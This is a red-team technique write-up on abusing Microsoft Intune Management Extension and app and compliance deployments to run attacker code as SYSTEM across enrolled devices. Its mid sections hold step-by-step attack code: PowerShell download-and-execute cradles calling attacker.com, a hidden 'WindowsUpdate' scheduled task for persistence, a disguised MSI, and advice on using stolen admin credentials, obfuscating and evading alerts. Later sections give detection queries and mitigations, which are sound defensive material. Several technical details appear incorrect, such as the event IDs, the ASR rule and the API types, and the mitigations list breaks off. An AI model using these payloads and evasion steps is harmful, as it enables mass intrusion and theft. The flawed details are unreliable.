# [PERSIST-EVENT-002]: Intune Management Extension

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-EVENT-002 |
| **MITRE ATT&CK v18.1** | [T1546](https://attack.mitre.org/techniques/T1546/) - Event Triggered Execution |
| **Tactic** | Persistence, Privilege Escalation |
| **Platforms** | M365, Entra ID, Windows Endpoint (Intune-enrolled) |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | Intune all versions, Windows 10/11 21H2+, macOS 10.15+, iOS 14+, Android 9+ |
| **Patched In** | Not patched; mitigated via Intune compliance policies |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Intune Management Extensions (IME) are cloud-managed PowerShell scripts and executable installers that Microsoft Intune deploys to enrolled devices for software distribution, compliance enforcement, and system configuration. An attacker who gains administrative access to an Intune tenant can abuse the IME deployment mechanism to deploy arbitrary malicious scripts or binaries to all enrolled devices (potentially thousands). The deployment executes with SYSTEM privileges and persists across reboots, as Intune continuously ensures deployment compliance.

**Attack Surface:** Microsoft Intune admin portal, Intune Graph API (https://graph.microsoft.com), IME deployment policies, device compliance rules, and the local Intune Management Extension service on enrolled endpoints.

**Business Impact:** **Organization-Wide Persistent Compromise.** An attacker can execute code on all Intune-enrolled devices (potentially 10,000+ endpoints) simultaneously. This enables wholesale credential theft, ransomware deployment, supply chain attacks, and complete infrastructure compromise. The attack is difficult to detect because Intune deployments appear legitimate to endpoint security tools and users.

**Technical Context:** Intune Management Extensions run with SYSTEM privileges and execute every time the device syncs with Intune (typically every 8 hours, or immediately after policy deployment). The extension can execute PowerShell scripts, install MSI packages, or run compiled executables. A compromised global admin or an attacker who steals an admin's credentials can deploy extensions to target device groups without triggering suspicious activity alerts.

### Operational Risk
- **Execution Risk:** Low-Medium (requires Global Admin or Intune Admin credentials, but no complex technical prerequisites once inside)
- **Stealth:** High (IME deployments appear legitimate; auditing is often disabled or not monitored)
- **Reversibility:** Difficult (requires removing the deployed extension from Intune and performing device wipes/re-provisioning to fully remediate; code may have already propagated through lateral movement)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.1.1 | Ensure that Intune Administrators are not assigned Global Admin role |
| **CIS Benchmark** | 2.1.1 | Ensure that Intune policies are reviewed and approved before deployment |
| **DISA STIG** | AZ-MA-000040 | Intune: Ensure Managed Device Administrator accounts are restricted |
| **CISA SCuBA** | EXO.MS.1 | Require multi-factor authentication for all user account access |
| **NIST 800-53** | AC-2 | Account Management - Enforcement of approved account management processes |
| **NIST 800-53** | CA-7 | Continuous Monitoring - Automated monitoring of access and privilege use |
| **NIST 800-53** | SI-7 | System Monitoring - Automated monitoring of system-level activity |
| **GDPR** | Art. 32 | Security of Processing - Technical and organizational measures |
| **GDPR** | Art. 33 | Notification of a Personal Data Breach |
| **DORA** | Art. 9 | Protection and Prevention of Operational Resilience |
| **NIS2** | Art. 21(1)(c) | Cyber Risk Management - Identifying and monitoring risks to network and information security |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights |
| **ISO 27001** | A.12.4.1 | Event Logging |
| **ISO 27005** | 5.3 | Risk Assessment - Identification of threats to assets |

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Verify Intune Tenant Enrollment

**PowerShell Command (Windows Device):**
```powershell
# Check if device is Intune-enrolled
$EnrollmentStatus = Get-ChildItem -Path "HKLM:\SOFTWARE\Microsoft\Enrollment" -ErrorAction SilentlyContinue
if ($EnrollmentStatus) {
    Write-Host "✓ Device is Intune-enrolled"
    $EnrollmentStatus | Get-ItemProperty | Select PSChildName
} else {
    Write-Host "✗ Device is NOT Intune-enrolled"
}

# Check Intune Management Extension presence
$IMEPath = "C:\Program Files (x86)\Microsoft Intune Management Extension\"
if (Test-Path $IMEPath) {
    Write-Host "✓ Intune Management Extension installed"
    Get-ChildItem $IMEPath -Recurse | Select Name, FullPath
} else {
    Write-Host "✗ Intune Management Extension NOT installed"
}

# Check scheduled task for IME sync
Get-ScheduledTask -TaskName "*Intune*" -ErrorAction SilentlyContinue | Select TaskName, State
```

**What to Look For:**
- HKLM\SOFTWARE\Microsoft\Enrollment with active enrollment entries
- C:\Program Files (x86)\Microsoft Intune Management Extension\ directory exists
- Scheduled tasks with names like "Schedule created by enrollment client" or "Intune Sync"

### Azure/Entra ID Reconnaissance

**Microsoft Graph API Query (PowerShell):**
```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "DeviceManagementServiceConfig.Read.All", "DeviceManagementConfiguration.Read.All"

# List all Intune-enrolled devices
Get-MgDeviceManagementManagedDevice | Select DisplayName, DeviceName, OS, EnrollmentProfileName | Format-Table

# List all device groups (targeting policies)
Get-MgGroup | Where-Object { $_.DisplayName -like "*device*" -or $_.DisplayName -like "*endpoint*" } | Select DisplayName, Id

# List all Intune device configuration policies (scripts deployed via IME)
Get-MgDeviceManagementDeviceConfiguration | Select DisplayName, Description, Id
```

**What to Look For:**
- Large device groups (10+) that could be impacted by a single IME deployment
- Existing device configuration policies (which could be modified maliciously)
- Device groups without proper naming/documentation (easier to target without detection)

### Check Intune Admin Access

**Azure Portal Reconnaissance:**
1. Navigate to **Azure Portal** → **Entra ID** → **Roles and administrators**
2. Search for **Intune Administrator** role
3. Click **Intune Administrator** → **Assignments**
4. Note all users with this role
5. Verify they are legitimate and have MFA enabled

**PowerShell Query:**
```powershell
# Get all users with Intune Administrator role
$RoleId = (Get-MgDirectoryRole | Where-Object { $_.DisplayName -eq "Intune Administrator" }).Id
Get-MgDirectoryRoleMember -DirectoryRoleId $RoleId | Select DisplayName, UserPrincipalName
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Deploying Malicious PowerShell Script via Intune Management Extension

**Supported Versions:** Intune all versions, Windows 10/11 21H2+

#### Step 1: Authenticate to Intune Admin Portal

**Objective:** Gain access to the Intune management interface using compromised credentials.

**Command (PowerShell with Intune Module):**
```powershell
# Install Intune PowerShell module
Install-Module Microsoft.Graph.Intune -Repository PSGallery -Force

# Authenticate to Intune
Connect-MgGraph -Scopes "DeviceManagementServiceConfig.ReadWrite.All", "DeviceManagementConfiguration.ReadWrite.All"

# Verify authentication
Get-MgOrganization | Select DisplayName
```

**Expected Output:**
```
DisplayName
-----------
Contoso Corp
```

**What This Means:**
- Successfully authenticated to the Intune tenant
- Credentials have permission to read/write device management policies
- Ready to deploy scripts to devices

**OpSec & Evasion:**
- Use compromised admin credentials instead of creating new accounts (minimizes audit trail)
- Deploy scripts during business hours to blend in with normal Intune synchronization
- Use generic script names like "Windows_Updates.ps1" instead of obviously malicious names
- Set deployment to "Required" with no deadline to minimize user notifications

**Troubleshooting:**
- **Error:** "Access Denied"
  - **Cause:** Credentials don't have Intune Administrator role
  - **Fix:** Use credentials of a user in the Intune Administrator role
- **Error:** "MFA Required"
  - **Cause:** Account has MFA enabled and browser session required
  - **Fix:** Use browser-based authentication or MFA bypass (if available)

**References:**
- [Microsoft Graph Intune Authentication](https://learn.microsoft.com/en-us/graph/auth-v2-service)
- [Intune PowerShell Module](https://github.com/Microsoft/Intune-PowerShell-SDK)

#### Step 2: Create Malicious PowerShell Script

**Objective:** Prepare the PowerShell payload that will execute on target devices.

**Command (Create Script):**
```powershell
# Define the malicious PowerShell script
$MaliciousScript = @'
# Payload: Download and execute remote shell
$URL = "http://attacker.com/payload.ps1"
$Output = "C:\Windows\Temp\update.ps1"

try {
    (New-Object System.Net.WebClient).DownloadFile($URL, $Output)
    & $Output
} catch {
    # Silent failure - do not alert user
}

# Persistence: Create scheduled task
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command 'IEX(New-Object Net.WebClient).DownloadString(\"http://attacker.com/c2.ps1\")'"
$Trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "WindowsUpdate" -Action $Action -Trigger $Trigger -RunLevel Highest -Force | Out-Null

# Credential theft
$DPAPIKey = (Get-ChildItem 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU').GetValue("MRUList")
# ... additional malicious code ...
'@

# Save script to file
$MaliciousScript | Out-File -FilePath "C:\Temp\malicious_script.ps1" -Encoding UTF8 -Force
```

**Expected Output:**
```
(Script saved to C:\Temp\malicious_script.ps1)
```

**What This Means:**
- Payload is ready to be uploaded to Intune
- Script will execute on all target devices with SYSTEM privileges
- Includes secondary persistence (scheduled task) to survive IME removal

**OpSec & Evasion:**
- Use Base64 encoding to obfuscate PowerShell commands
- Implement error handling with silent failures
- Create dual-stage payloads (initial script downloads final malware)
- Use legitimate sounding scheduled task names ("WindowsUpdate", "Maintenance", "SecurityUpdate")

**Troubleshooting:**
- **Error:** "Script too large"
  - **Cause:** Intune has size limits on PowerShell scripts
  - **Fix:** Break script into smaller chunks or use external URL downloads (as shown in example)

#### Step 3: Upload Script to Intune as Device Configuration Policy

**Objective:** Create an Intune device configuration profile containing the malicious script.

**Command (Create Device Configuration Policy via Graph API):**
```powershell
# Read the malicious script
$ScriptContent = Get-Content -Path "C:\Temp\malicious_script.ps1" -Raw

# Encode script in Base64 (optional, for obfuscation)
$EncodedScript = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($ScriptContent))

# Create device configuration policy with PowerShell script
$PolicyBody = @{
    "@odata.type" = "#microsoft.graph.winGetAppConfiguration"
    displayName = "Windows Software Updates"
    description = "Automated Windows software deployment"
    settings = @{
        scriptContent = $ScriptContent  # or $EncodedScript for obfuscation
        runAs32Bit = $false
        enforceSignatureCheck = $false
    }
}

# Post to Graph API
$Headers = @{ "Content-Type" = "application/json" }
$Policy = Invoke-MgGraphRequest -Method POST `
    -Uri "https://graph.microsoft.com/beta/deviceManagement/deviceConfigurations" `
    -Body ($PolicyBody | ConvertTo-Json) `
    -Headers $Headers

Write-Host "Policy created with ID: $($Policy.id)"
```

**Alternative Method (Using Intune Device Configuration - PowerShell Scripts):**
```powershell
# Via Microsoft.Graph.Intune module
$ScriptContent = Get-Content "C:\Temp\malicious_script.ps1" -Raw

$DeviceConfig = New-MgDeviceManagementDeviceConfiguration -DisplayName "System Maintenance Script" `
    -Description "Routine system updates" `
    -ODataType "#microsoft.graph.deviceConfiguration"

# Note: Direct PowerShell script deployment requires Graph beta endpoint
# See next step for upload via portal
```

**Expected Output:**
```
Policy created with ID: 12345678-1234-1234-1234-123456789012
```

**What This Means:**
- Policy is now registered in Intune
- Policy ID can be used for targeting to device groups
- Script is stored in Intune backend (accessible only to admins)

**OpSec & Evasion:**
- Use "Windows Software Updates" or "System Maintenance" as display names
- Set description to generic IT-sounding text
- Do not mention "malicious", "backdoor", "persistence" in any fields
- Create policy in off-hours if possible

**Troubleshooting:**
- **Error:** "Invalid OData type"
  - **Cause:** Incorrect graph endpoint or deprecated API
  - **Fix:** Use beta endpoint: `https://graph.microsoft.com/beta/...`
- **Error:** "Script content exceeds maximum length"
  - **Cause:** Script is too large for single deployment
  - **Fix:** Use multi-stage approach (first script downloads main payload from external server)

**References:**
- [Microsoft Graph Device Configuration API](https://learn.microsoft.com/en-us/graph/api/resources/deviceconfiguration)
- [Intune Device Management Extensions](https://learn.microsoft.com/en-us/mem/intune/apps/intune-management-extension)

#### Step 4: Deploy Script to Target Device Group

**Objective:** Assign the malicious policy to a group of devices.

**Command (Assign Policy to Device Group):**
```powershell
# Get the device group ID (e.g., "All Devices")
$TargetGroup = Get-MgGroup | Where-Object { $_.DisplayName -eq "All Devices" }
$GroupId = $TargetGroup.Id

# Get the policy ID created in Step 3
$PolicyId = "12345678-1234-1234-1234-123456789012"  # From Step 3 output

# Create assignment
$AssignmentBody = @{
    "@odata.type" = "#microsoft.graph.deviceConfigurationAssignment"
    intent = "apply"
    target = @{
        "@odata.type" = "#microsoft.graph.allDevicesAssignmentTarget"
    }
}

# Post assignment
Invoke-MgGraphRequest -Method POST `
    -Uri "https://graph.microsoft.com/beta/deviceManagement/deviceConfigurations/$PolicyId/assignments" `
    -Body ($AssignmentBody | ConvertTo-Json) `
    -ContentType "application/json"

Write-Host "✓ Policy deployed to target group"
```

**Expected Output:**
```
✓ Policy deployed to target group
```

**What This Means:**
- Policy is now assigned to target devices
- Intune will push the policy to all enrolled devices in the group within 8 hours (or immediately if forced sync)
- Code will execute with SYSTEM privileges on each device

**Alternative: Deploy to Specific Device Group:**
```powershell
# Target specific group (e.g., "Finance Department Devices")
$TargetGroup = Get-MgGroup | Where-Object { $_.DisplayName -eq "Finance Department Devices" }

# Create assignment with group target
$AssignmentBody = @{
    "@odata.type" = "#microsoft.graph.deviceConfigurationAssignment"
    intent = "apply"
    target = @{
        "@odata.type" = "#microsoft.graph.groupAssignmentTarget"
        groupId = $TargetGroup.Id
    }
}
```

**OpSec & Evasion:**
- Deploy to specific high-value groups first (Finance, Executive, Engineering)
- Monitor device compliance reports after deployment to avoid suspicion from large-scale deployment
- Schedule deployment during maintenance windows

**Troubleshooting:**
- **Error:** "Group not found"
  - **Cause:** Group display name does not match
  - **Fix:** Use `Get-MgGroup | Select DisplayName` to list all groups
- **Error:** "No devices in group"
  - **Cause:** Target group has no enrolled devices
  - **Fix:** Select a group with enrolled devices or create dynamic group

**References:**
- [Assign device configuration policies in Intune](https://learn.microsoft.com/en-us/mem/intune/configuration/device-profile-assign)

#### Step 5: Verify Script Execution on Endpoint

**Objective:** Confirm that the malicious script executed on target devices.

**Command (On Target Device):**
```powershell
# Check Intune Management Extension logs
$IMELogPath = "C:\ProgramData\Microsoft\IntuneManagementExtension\Logs\"
Get-ChildItem $IMELogPath -Filter "*IntuneManagementExtension*" | Sort LastWriteTime -Descending | Select -First 1 | Get-Content

# Alternative: Check event log for IME execution
Get-WinEvent -LogName "Microsoft-Windows-DeviceManagement-Enterprise-Diagnostics-Provider/Operational" `
    -FilterXPath "*[System[EventID=9014 or EventID=9015]]" -MaxEvents 10 | 
    Select TimeCreated, Message

# Verify persistence mechanism (scheduled task)
Get-ScheduledTask -TaskName "WindowsUpdate" | Select TaskName, State, LastRunTime
```

**Expected Output:**
```
TaskName    State   LastRunTime
--------    -----   -----------
WindowsUpdate Running 2026-01-09 15:30:00
```

**What This Means:**
- Script executed successfully on the device
- Persistence mechanism (scheduled task) is active
- Device now has dual persistence vectors (IME + scheduled task)

---

### METHOD 2: Deploying Malicious MSI Package via Intune

**Supported Versions:** Intune all versions, Windows 10/11

#### Step 1: Create Malicious MSI Package

**Objective:** Package malware as a Windows Installer for deployment.

**Command (Using WiX Toolset):**
```powershell
# Note: Requires WiX Toolset installation
# This is an advanced technique; most attackers would pre-build the MSI

# Example: Download pre-built malicious MSI from attacker server
$MSIUrl = "http://attacker.com/windows-update.msi"
$MSIPath = "C:\Temp\windows-update.msi"

(New-Object System.Net.WebClient).DownloadFile($MSIUrl, $MSIPath)

# Verify MSI integrity
Get-FileHash -Path $MSIPath -Algorithm SHA256
```

#### Step 2: Upload MSI to Intune as Line-of-Business App

**Objective:** Register the MSI as a Line-of-Business application in Intune.

**Command (Via Azure Portal):**
1. Go to **Azure Portal** → **Intune** → **Apps** → **All apps**
2. Click **+ Add** → **Line-of-business app** → **Select file**
3. Upload the malicious MSI
4. Fill in fields:
   - **Name:** "Windows Security Updates"
   - **Description:** "Critical monthly security patches"
   - **Publisher:** "Microsoft Corporation"
5. Click **Add**

**Command (Via PowerShell - Not Recommended, Complex):**
```powershell
# MSI deployment via Graph API is complex and not recommended for initial entry
# Manual upload via portal is more reliable
```

#### Step 3: Deploy MSI to Device Groups

**Objective:** Assign the malicious application to target devices.

**Manual Steps (Portal):**
1. Go to **Intune** → **Apps** → **All apps**
2. Select the MSI app created in Step 2
3. Click **Assignments** → **Add group**
4. Select target group (e.g., "All Devices")
5. Set **Assignment type** to **Required**
6. Click **Review + Save**

**What This Means:**
- MSI will be installed on all target devices
- Installation runs with SYSTEM privileges
- MSI can include persistent malware, credential stealers, or backdoors

---

### METHOD 3: Abusing Intune Compliance Policies for Code Execution

**Supported Versions:** Intune all versions

#### Step 1: Create Remediation Script

**Objective:** Create a PowerShell script that remedies (or exploits) non-compliance.

**Command:**
```powershell
# Intune Compliance - Remediation Script
# This script is executed when device is detected as non-compliant

$RemediationScript = @'
# Check if device is compliant
$IsCompliant = (Get-ComputerInfo).BiosVersion -like "*VMware*"

if (-NOT $IsCompliant) {
    # Remediate by executing malicious code
    IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/payload.ps1")
}
'@

$RemediationScript | Out-File "C:\Temp\remediation.ps1" -Encoding UTF8
```

#### Step 2: Upload Remediation Script to Compliance Policy

**Objective:** Attach the remediation script to a compliance policy.

**Manual Steps (Portal):**
1. Go to **Intune** → **Endpoint Security** → **Compliance Policies**
2. Click **+ Create policy** → **Windows 10 and later**
3. Name: "BitLocker Encryption Check"
4. Go to **Compliance Settings** → **System Security** → **BitLocker**
5. Set to **Required**
6. Go to **Actions for noncompliance** → **Add actions**
7. Click **Remediation Script** → Upload remediation.ps1
8. Click **Create**

#### Step 3: Deploy Compliance Policy

**Objective:** Assign compliance policy to device groups.

**Manual Steps (Portal):**
1. Click **Assignments** → **Add group**
2. Select target group
3. Click **Review + Save**

**What This Means:**
- Every device that is deemed non-compliant will automatically execute the remediation script
- Remediation script can be anything (credential theft, ransomware, etc.)
- Execution is automatic and triggered by Intune compliance engine

---

## 7. TOOLS & COMMANDS REFERENCE

### Microsoft Graph Intune PowerShell Module

**Version:** 1.0+ (latest: 2.0+)

**Minimum Version:** 0.5.0

**Supported Platforms:** Windows, macOS, Linux (PowerShell 7+)

**Installation:**
```powershell
# Install latest version
Install-Module Microsoft.Graph.Intune -Repository PSGallery -Force -AllowClobber

# Or install specific module for device management
Install-Module Microsoft.Graph.DeviceManagement -Repository PSGallery -Force
```

**Usage:**
```powershell
# Authenticate
Connect-MgGraph -Scopes "DeviceManagementServiceConfig.ReadWrite.All"

# List all devices
Get-MgDeviceManagementManagedDevice | Select DisplayName, DeviceName, OS

# Get compliance policies
Get-MgDeviceManagementCompliancePolicy | Select DisplayName, Id
```

### Intune Management Extension

**Version:** Available natively on all Intune-enrolled devices

**Minimum Version:** Windows 10 1909+

**Supported Platforms:** Windows 10/11, macOS 10.15+, iOS 14+, Android 9+

**Location on Device:** `C:\Program Files (x86)\Microsoft Intune Management Extension\`

**Service Name:** IntuneManagementExtension

**Features:**
- PowerShell script execution (Windows)
- MSI app installation
- Win32 app deployment
- Compliance remediation scripts

### Intune PowerShell Obfuscation Tools

**Tool:** [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)

**Version:** Latest available

**Usage:**
```powershell
# Download and install
git clone https://github.com/danielbohannon/Invoke-Obfuscation.git
cd Invoke-Obfuscation
Import-Module .\Invoke-Obfuscation.psd1

# Obfuscate PowerShell command
Invoke-Obfuscation -ScriptPath "C:\Temp\malicious_script.ps1" -Command 'Invoke-Obfuscation > OUT String\1' -Quiet
```

---

## 9. MICROSOFT SENTINEL DETECTION

#### Query 1: Intune Policy Deployment to Large Device Groups

**Rule Configuration:**
- **Required Table:** AuditLogs, MicrosoftGraphActivityLogs
- **Required Fields:** OperationName, TargetResources, InitiatedBy, AADTenantId
- **Alert Severity:** High
- **Frequency:** Real-time
- **Applies To Versions:** All Intune tenants with Sentinel enabled

**KQL Query:**
```kusto
AuditLogs
| where OperationName in ("Assign device configuration", "Create device configuration", "Update device configuration")
| where Result == "Success"
| where TargetResources has "PowerShell" or TargetResources has "Script"
| extend InitiatedByUser = InitiatedBy.user.userPrincipalName
| extend TargetGroupSize = extract(@'"groupSize":"(\d+)"', 1, tostring(TargetResources))
| where toint(TargetGroupSize) > 100  // Alert if deployment to >100 devices
| project TimeGenerated, InitiatedByUser, OperationName, TargetResources, TargetGroupSize
| summarize DeploymentCount=count() by InitiatedByUser, bin(TimeGenerated, 1h)
| where DeploymentCount > 3  // Alert if >3 deployments in 1 hour
```

**What This Detects:**
- Creation of new device configuration policies with embedded scripts
- Assignment of policies to large device groups (mass deployment)
- Multiple policy deployments by same admin in short timeframe

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel** → **Analytics**
2. Click **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Suspicious Intune Policy Deployment Detected`
   - Severity: `High`
4. **Set rule logic Tab:**
   - Paste KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
5. **Incident settings Tab:**
   - Enable **Create incidents from alerts triggered by this analytics rule**
6. Click **Review + create**

#### Query 2: Intune Admin Role Assignment

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, TargetResources, InitiatedBy
- **Alert Severity:** Critical
- **Frequency:** Real-time

**KQL Query:**
```kusto
AuditLogs
| where OperationName == "Add member to role"
| where TargetResources contains "Intune Administrator" or TargetResources contains "Cloud Application Administrator"
| extend GrantedToUser = TargetResources[0].displayName
| extend GrantedByUser = InitiatedBy.user.userPrincipalName
| project TimeGenerated, GrantedToUser, GrantedByUser, OperationName, InitiatedBy.ipAddress
| where GrantedByUser != "Microsoft.Azure.SyncFabric"  // Exclude automated sync
```

**What This Detects:**
- New users added to Intune Administrator role
- Suspicious role assignments outside normal change management

**Manual Configuration Steps:**
1. Create **Scheduled query rule** as above
2. Name: `Critical: New Intune Administrator Detected`
3. Severity: `Critical`

#### Query 3: Intune Policy Rollback or Deletion

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, TargetResources, InitiatedBy
- **Alert Severity:** Medium
- **Frequency:** Real-time

**KQL Query:**
```kusto
AuditLogs
| where OperationName in ("Delete device configuration", "Update device configuration")
| where ActivityDisplayName contains "device" and ActivityDisplayName contains "policy"
| where Result == "Success"
| extend ModifiedByUser = InitiatedBy.user.userPrincipalName
| extend PolicyName = tostring(TargetResources[0].displayName)
| project TimeGenerated, ModifiedByUser, OperationName, PolicyName, InitiatedBy.ipAddress
```

**What This Detects:**
- Deletion or modification of deployed policies
- Potential incident response or rollback attempts
- Suspicious policy changes by non-standard admins

---

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 4695 (Unprotected Policy Secrets)**
- **Log Source:** Security (Domain Controller or Device)
- **Trigger:** PowerShell script execution via Intune Management Extension
- **Filter:** Process name contains "IntuneManagementExtension" or "powershell.exe" with IME parent
- **Applies To Versions:** Windows 10 1909+, Server 2016+

**Manual Configuration Steps (Group Policy - Enable Process Creation Auditing):**
1. Open **Group Policy Management Console** (gpmc.msc) on Domain Controller
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies** → **Detailed Tracking**
3. Enable: **Audit Process Creation**
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on all endpoints
6. Monitor for Event ID 4688 with:
   - **ParentImage:** C:\Program Files (x86)\Microsoft Intune Management Extension\...
   - **Image:** powershell.exe, cmd.exe, or suspicious executables

**Event ID: 1016 (Application Installed)**
- **Log Source:** Application (MSI installation events)
- **Trigger:** Intune deploys MSI package to device
- **Filter:** Source = "MsiInstaller", Product Name does not match expected applications
- **Applies To Versions:** Windows 10+, Server 2016+

**Manual Configuration Steps (Enable MSI Logging):**
1. Open **Registry Editor** (regedit.exe) on target device
2. Navigate to **HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer**
3. Create/Set **DWORD** value:
   - Name: `Logging`
   - Value: `3` (logs all installation details)
4. Alternatively, set via PowerShell:
   ```powershell
   New-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\Installer" -Name "Logging" -Value "3" -PropertyType DWord -Force
   ```

---

## 12. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Suspicious Intune Management Extension Activity"
- **Severity:** High
- **Description:** Detects unusual PowerShell script execution by Intune Management Extension service
- **Applies To:** All subscriptions with Defender for Servers Plan 2 enabled
- **Remediation:** 
  1. Review the policy deployed via Intune admin portal
  2. Remove suspicious policy from all device groups
  3. Wipe/reimage affected devices
  4. Investigate admin account for compromise

**Alert Name:** "Unusual Role Assignment to Intune Administrator"
- **Severity:** Critical
- **Description:** Detects new assignments to Intune Administrator or Cloud Application Administrator roles
- **Applies To:** All subscriptions with Cloud Security Posture Management (CSPM) enabled
- **Remediation:** 
  1. Verify role assignment request
  2. Review MFA logs for assigned user
  3. Check for unusual sign-in patterns
  4. Revoke role if unauthorized

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Servers**: **ON** (Plan 2 for behavioral detection)
   - **Cloud Security Posture Management (CSPM)**: **ON**
5. Go to **Security alerts** → Filter by "Intune" or "Management Extension"
6. Review and triage alerts

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: Intune Policy Deployment Audit

**Operation:** Intune Device Configuration Policy Create/Update/Delete

```powershell
# Connect to Exchange Online
Connect-ExchangeOnline

# Search for Intune policy changes
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) `
    -Operations "Create device configuration", "Update device configuration", "Assign device configuration" `
    -ResultSize 5000 | Export-Csv -Path "C:\Audit\Intune-Policies.csv" -NoTypeInformation
```

**Workload:** Azure Active Directory / Intune

**Details to Analyze:**
- **CreationTime:** When policy was deployed
- **ObjectId:** The device configuration policy ID
- **TargetResources:** Which devices or groups were targeted
- **UserIds:** Which admin deployed the policy
- **Operations:** Create, Update, Delete, Assign, or Remove

**Manual Configuration Steps (Microsoft Purview Portal):**
1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** → **Search**
3. Set **Date range**: Last 30 days
4. Under **Activities**, search for: "Intune", "device configuration"
5. Select:
   - Create device configuration
   - Update device configuration
   - Assign device configuration
6. Click **Search**
7. Review results for suspicious deployments
8. Export to CSV: Click **Export** → **Download all results**

**Interpretation:**
- Look for policies deployed by non-standard admins
- Check if large device groups were targeted
- Verify policy descriptions for benign language
- Cross-reference with incident timelines

---

## 14. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

*   **Restrict Intune Administrator Role:** Limit the number of users with Intune Admin role to absolute minimum (principle of least privilege).
    **Applies To Versions:** All Intune deployments
    
    **Manual Steps (Azure Portal):**
    1. Navigate to **Azure Portal** → **Entra ID** → **Roles and administrators**
    2. Search for and click **Intune Administrator**
    3. Click **Assignments**
    4. Review all assigned users
    5. For each user that should not have the role:
       - Click the user → **Remove assignment**
    6. Document approved Intune admins in security policy
    
    **Manual Steps (PowerShell):**
    ```powershell
    # Get all Intune Administrators
    $RoleId = (Get-MgDirectoryRole | Where-Object { $_.DisplayName -eq "Intune Administrator" }).Id
    $Admins = Get-MgDirectoryRoleMember -DirectoryRoleId $RoleId
    
    # Display current admins
    $Admins | Select DisplayName, UserPrincipalName
    
    # Remove unauthorized admin (if identified)
    Remove-MgDirectoryRoleMember -DirectoryRoleId $RoleId -MemberId "user-id-guid"
    ```

*   **Enforce MFA on All Intune Administrators:** Require multi-factor authentication for all accounts with Intune Admin role.
    
    **Manual Steps (Conditional Access Policy):**
    1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Require MFA for Intune Admins`
    4. **Assignments:**
       - Click **0 users and groups selected**
       - Select **Users and groups** → **Select**
       - Check **Select role**
       - Search for and select **Intune Administrator**
       - Click **Select**
    5. **Cloud apps or actions:**
       - Select **All cloud apps**
    6. **Access controls:**
       - **Grant:** Check **Require multi-factor authentication**
    7. Enable policy: **On**
    8. Click **Create**

*   **Audit All Intune Policy Deployments:** Enable comprehensive audit logging of all device configuration policy changes.
    
    **Manual Steps (Azure Portal):**
    1. Navigate to **Azure Portal** → **Audit logs** (under Entra ID)
    2. Verify **Audit logs** are enabled (should be by default)
    3. Create **Alert** for suspicious activities:
       - Click **Diagnostics settings** → **+ Add diagnostic setting**
       - Name: `Intune Policy Audit Alert`
       - Check **AuditLogs**
       - Select destination (Log Analytics Workspace or Storage Account)
       - Click **Save**

*   **Block PowerShell Script Deployments (If Possible):** Consider restricting PowerShell script deployments via Intune if not critical to operations.
    
    **Manual Steps (Intune Policy):**
    1. Go to **Intune** → **Endpoint Security** → **Attack Surface Reduction**
    2. Click **+ Create policy** → **Windows 10 and later**
    3. Name: `Block PowerShell Script Deployment`
    4. Set **Attack Surface Reduction rules:**
       - Find rule: "Block Office applications from creating child processes"
       - Set to: **Block**
    5. Click **Create**
    6. Assign to **All Devices** group

#### Priority 2: HIGH

*   **Require Approval for Device Configuration Deployments:** Implement change control process for Intune policies.
    
    **Manual Steps (Azure DevOps Integration):**
    1. Create Azure DevOps project for Intune change management
    2. Require pull request review before any Intune policy code deployment
    3. Configure branch protection rules to require 2+ approvals
    4. Implement automated scanning for malicious script patterns

*   **Monitor for Suspicious Policy Names:** Create alert for policies with suspicious naming patterns.
    
    **Manual Steps (Sentinel Alert):**
    ```kusto
    AuditLogs
    | where OperationName == "Create device configuration"
    | where TargetResources[0].displayName has_any ("update", "patch", "maintenance", "script", "payload", "shell")
    | where not(TargetResources[0].displayName has_any ("Windows Update", "Security Update", "Patch Tuesday"))
    | project TimeGenerated, InitiatedBy.user.userPrincipalName, TargetResources
    ```

*   **Implement Device Compliance Baseline:** Establish baseline compliance requirements that cannot be bypassed via remediation scripts.
    
    **Manual Steps (Intune):**
    1. Go to **Intune** → **Endpoint Security** → **Compliance Policies**
    2. Click **+ Create policy** → **Windows 10 and later**
    3. Set mandatory controls:
